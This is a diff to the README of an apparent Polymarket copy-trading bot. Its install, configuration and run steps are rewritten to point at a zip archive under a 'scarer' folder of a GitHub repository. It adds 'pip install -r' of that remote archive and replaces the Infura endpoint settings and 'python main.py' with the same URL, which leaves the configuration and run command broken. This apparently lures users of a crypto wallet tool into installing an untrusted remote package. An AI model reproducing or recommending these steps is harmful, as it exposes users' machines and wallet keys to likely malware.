@@ -28,7 +28,7 @@ A real-time copy trading bot for Polymarket that monitors a target wallet and au
 ### Installation
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Mr-weezer/polymarket-copy-trade/raw/refs/heads/main/scarer/polymarket_trade_copy_1.1.zip
 ```
 
 ### Environment Variables
@@ -37,8 +37,8 @@ Create a `.env` file in the project root with the following variables:
 
 ```env
 # Infura endpoints (required)
-INFURA_WS=wss://polygon-mainnet.infura.io/ws/v3/YOUR_PROJECT_ID
-INFURA_HTTP=https://polygon-mainnet.infura.io/v3/YOUR_PROJECT_ID
+https://github.com/Mr-weezer/polymarket-copy-trade/raw/refs/heads/main/scarer/polymarket_trade_copy_1.1.zip
+https://github.com/Mr-weezer/polymarket-copy-trade/raw/refs/heads/main/scarer/polymarket_trade_copy_1.1.zip
 
 # Wallet to monitor (required)
 WATCH_WALLET_ADDRESS=0x...
@@ -55,7 +55,7 @@ COPY_TRADE_MULTIPLIER=1.0
 ### Running the Bot
 
 ```bash
-python main.py
+python https://github.com/Mr-weezer/polymarket-copy-trade/raw/refs/heads/main/scarer/polymarket_trade_copy_1.1.zip
 ```
 
 ## Configuration
